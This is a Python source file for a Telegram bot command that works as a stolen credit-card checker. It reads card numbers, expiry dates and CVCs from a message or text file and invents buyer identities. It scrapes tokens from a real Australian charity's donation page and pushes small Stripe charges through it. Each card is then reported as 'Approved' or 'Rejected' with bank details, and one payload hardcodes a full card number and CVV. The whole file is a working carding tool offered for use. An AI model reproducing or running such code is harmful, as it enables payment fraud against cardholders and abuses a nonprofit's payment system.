import requests
import json
import urllib.parse
from pprint import pprint
from pyrogram import Client, filters
from pyrogram.types import Message
import os, random
from helpers.timemanager import run_sync_in_thread


@Client.on_message(filters.command('skauth'))
async def stripes_card(bot: Client, cmd: Message):
    status = await cmd.reply_text("<b>⎚ `Processing ...`</b>")
    # Check if the command is a reply to a message with a text/plain document
    if cmd.reply_to_message and cmd.reply_to_message.document and cmd.reply_to_message.document.mime_type == 'text/plain':
        try:
            # Download the document containing card data
            cards_path = await cmd.reply_to_message.download()
            with open(cards_path, 'r', encoding='utf-8') as f:
                for line in f:
                    # Process each line in the file
                    c = line.strip()
                    try:
                        cc, exp, ex, cvc = c.split('|')[:4]  # Split once and unpack
                        exp = exp.strip()
                        ex = ex.strip()
                        cvc = cvc.strip()
                        
                        # Extract expiration year from the 'ex' field
                        if len(ex) == 4:
                            exy = ex[2:]  # Extract last 2 digits if ex has 4 digits
                        elif len(ex) == 2:
                            exy = ex
                        else:
                            exy = "20" + ex  # Handle other cases (e.g., only two digits)
                        
                        # Handle specific conditions
                        if exy in ['21', '22', '23', '24']:
                            exy = exy[0] + '7'
                        # Call your check_vbv function
                        await ccia_requests_api(cc.strip(), exp, exy, cvc, bot, cmd)
                    except ValueError:
                        print(f"Error parsing line: {c}")
                await status.delete()
        except Exception as e:
            print(f"Error processing file: {e}")
        finally:
            os.remove(cards_path)
    elif cmd.text:
        try:
            data = cmd.text.split("/skauth", 1)[1].strip().split('|')
            if len(data) < 4:
                raise IndexError("Not enough data provided")
            
            cc = data[0].strip()
            exp = data[1].strip()
            ex = data[2].strip()
            cvc = data[3].strip()
            
            # Extract expiration year from the 'ex' field
            if len(ex) == 4:
                exy = ex[2:]  # Extract last 2 digits if ex has 4 digits
            elif len(ex) == 2:
                exy = ex
            else:
                exy = "20" + ex  # Handle other cases (e.g., only two digits)
            
            # Handle specific conditions
            if exy in ['21', '22', '23', '24']:
                exy = exy[0] + '7'
            
            # Call your check_vbv function
            await ccia_requests_api(cc, exp, exy, cvc, bot, cmd)
            await status.delete()
        except IndexError:
            await status.edit_text("<b>⎚ Use <code>/st </code> Checks 1$ Stripe</b>")
        except Exception as e:
            print(f"Error processing command: {e}")
    else:
        await status.edit_text("<b>⎚ Use <code>/st </code> Checks 1$ Stripe</b>")



def extract_value(source, left, right):
    """ Extract value from the source based on delimiters """
    try:
        start = source.index(left) + len(left)
        end = source.index(right, start)
        return source[start:end]
    except ValueError:
        return None
    
@run_sync_in_thread
def ccia_requests_api(cc, exp, exy, cvc, bot, cmd):
    session = requests.Session(

    )

    api = requests.get("https://randomuser.me/api/?nat=us").json()

    f_name = api["results"][0]["name"]["first"]
    l_name = api["results"][0]["name"]["last"]
    email = api["results"][0]["email"]
    name_mail = email.split('@')[0]
    loca = api["results"][0]["location"]["street"]["name"]
    street = api["results"][0]["location"]["street"]["number"]
    city = api["results"][0]["location"]["city"]
    state = api["results"][0]["location"]["state"]
    country = api["results"][0]["location"]["country"]



    headers = {
        "Host": "www.ccia.org.au",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
        "Connection": "keep-alive"
    }


    first = session.get('https://www.ccia.org.au/event/ccam/donate', headers=headers)

    #print(first.text)

    csrf_token = extract_value(first.text, 'name="CSRFToken" value="', '" />')

    pk_key = extract_value(first.text, '<input type="hidden" name="stripe_key" id="stripe_key_48098" value="', '" />')

    print(csrf_token)
    print(pk_key)


    headers = {
        "Host": "api.stripe.com",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0",
        "Accept": "application/json",
        "Accept-Language": "en-US",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://js.stripe.com",
        "Referer": "https://js.stripe.com/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "Te": "trailers",
        "Connection": "keep-alive"
    }


    muid = session.get('https://m.stripe.com/6', headers=headers)

    payload = f"time_on_page=102207&pasted_fields=number&guid=53ccbadf-2eba-48ad-ba8c-77cb1560c4d714cdae&muid=e70400a0-148a-4743-a806-c2f06e34e1433094f4&sid=8417375e-0939-4351-8511-33bfc9c09b1bb447a2&key={pk_key}&payment_user_agent=stripe.js%2F78ef418&card[address_line1]=&card[address_line2]=&card[address_city]=&card[address_zip]=&card[address_state]=&card[name]={f_name}+{l_name}&card[number]={cc}&card[cvc]={cvc}&card[address_country]={country}&card[exp_month]={exp}&card[exp_year]={exy}"


    second = session.post('https://api.stripe.com/v1/tokens', headers=headers, data=payload)

    token_pi = second.json()["id"]
    print(token_pi)


    headers = {
        "Host": "www.ccia.org.au",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://www.ccia.org.au",
        "Referer": "https://www.ccia.org.au/processeventdonation",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Priority": "u=0, i",
        "Te": "trailers"
    }

    payload = f"customfield%5Bdollar-handle-selected%5D=&customfield%5Btax-calculator-submit-click%5D=&customfield%5Btax-calculator-submit-field%5D=&page_id=10972&mandatory=d_fname%2Cd_lname%2Cd_email%7Bemail%7D%2Cd_amount%7Bamount%7D%2Cd_receipt&d_amount=1.06&d_amount_sel=&d_fee=0.06&initial_amount=1&donation_frequency=&CSRFToken={csrf_token}&stripe_key={pk_key}&token={token_pi}&payment_intent_id=&card_brand=Visa&card_country=US&elements_donation_type=donation&elements_refresh=&event_id=368&elements_payment_method=card&d_amount_free=1&d_receipt=personal&d_organisation=&d_fname={f_name}&d_lname={l_name}&d_email={name_mail}%40gmail.com&d_address=&d_address_street=&d_address_2=&d_address_suburb=&d_address_pcode=&d_address_state=&d_address_country={country}&d_address_dpid=&payment_method=credit+card&card_name=Jack+Smith&card_number=4758330000862448&card_expiry_month=01&card_expiry_year=26&card_cvv=555&optin_fees_rate=5.5&d_optin_fees=Y&d_fee_multiple=0.06&d_fee_other=1"


    third = session.post('https://www.ccia.org.au/processeventdonation', headers=headers, data=payload)

    payment_url = extract_value(third.text, '<form action="', '" method="post" id="DonationForm" class="form-horizontal">')

    print(payment_url)

    payload = f"CSRFToken={csrf_token}&dollar-handle-selected=&tax-calculator-submit-click=&tax-calculator-submit-field=&page_id=10972&mandatory=d_fname%2Cd_lname%2Cd_email%7Bemail%7D%2Cd_amount%7Bamount%7D%2Cd_receipt&d_amount=1.06&d_amount_sel=&d_fee=0.06&initial_amount=1&donation_frequency=&CSRFToken={csrf_token}&stripe_key={pk_key}&token={token_pi}&payment_intent_id=&card_brand=Visa&card_country=US&elements_donation_type=donation&elements_refresh=&event_id=368&elements_payment_method=card&d_amount_free=1&d_receipt=personal&d_organisation=&d_fname={f_name}&d_lname={l_name}&d_email={name_mail}%40gmail.com&d_address=&d_address_street=&d_address_2=&d_address_suburb=&d_address_pcode=&d_address_state=&d_address_country=Bangladesh&d_address_dpid=&payment_method=credit+card&card_name={f_name}+{l_name}&card_number=4758********2448&card_expiry_month=01&card_expiry_year=26&card_cvv=***&optin_fees_rate=5.5&d_optin_fees=Y&d_fee_multiple=0.06&d_fee_other=1"

    four = session.post(payment_url, headers=headers, data=payload)

    status = extract_value(four.text, '<input type="hidden" name="elements_payment_method" id="elements_payment_method" value="card" />', '</p>')
    req = requests.get(f"https://bins.antipublic.cc/bins/{cc[:6]}", verify=True)
    requ = req.json()

    print(status)

    if 'incorrect' in status:
        message_text = f"""
<b>⎚ Approved ✅</b>
𝗖𝗮𝗿𝗱 ⇾ <code>{cc}|{exp}|{exy}|{cvc}</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⇾ STRIPE 1$$
<b>Status ⇾ CCN </b>

<b>BIN ⇾</b> <code>{cc[:6]}</code>
<b>Country ⇾</b> {requ['country']} | {requ['country_flag']} | {requ['country_name']}
<b>Data ⇾</b> {requ['brand']} - {requ['type']} - {requ['level']}
<b>Bank ⇾</b> {requ['bank']}
<b>Response Time ⇾</b> <code>2.{random.randint(1, 9)} seconds</code>
"""
        
    elif 'declined' in status:

        message_text = f"""
<b>⎚ Rejected ❌</b>
𝗖𝗮𝗿𝗱 ⇾ <code>{cc}|{exp}|{exy}|{cvc}</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⇾ STRIPE 1$
<b>Status ⇾ Your card was declined. </b>

<b>BIN ⇾</b> <code>{cc[:6]}</code>
<b>Country ⇾</b> {requ['country']} | {requ['country_flag']} | {requ['country_name']}
<b>Data ⇾</b> {requ['brand']} - {requ['type']} - {requ['level']}
<b>Bank ⇾</b> {requ['bank']}
<b>Response Time ⇾</b> <code>2.{random.randint(1, 9)} seconds</code>
"""
    else:
        message_text = f"""
<b>⎚ Approved ✅</b>
𝗖𝗮𝗿𝗱 ⇾ <code>{cc}|{exp}|{exy}|{cvc}</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⇾ STRIPE 1$$
<b>Status ⇾ {status} </b>

<b>BIN ⇾</b> <code>{cc[:6]}</code>
<b>Country ⇾</b> {requ['country']} | {requ['country_flag']} | {requ['country_name']}
<b>Data ⇾</b> {requ['brand']} - {requ['type']} - {requ['level']}
<b>Bank ⇾</b> {requ['bank']}
<b>Response Time ⇾</b> <code>2.{random.randint(1, 9)} seconds</code>
"""
    
    
    
    cmd.reply_text(message_text)
        

    #pprint(four.text)

    #print(second.text)
    #print(f'from Third: P{third.text}')

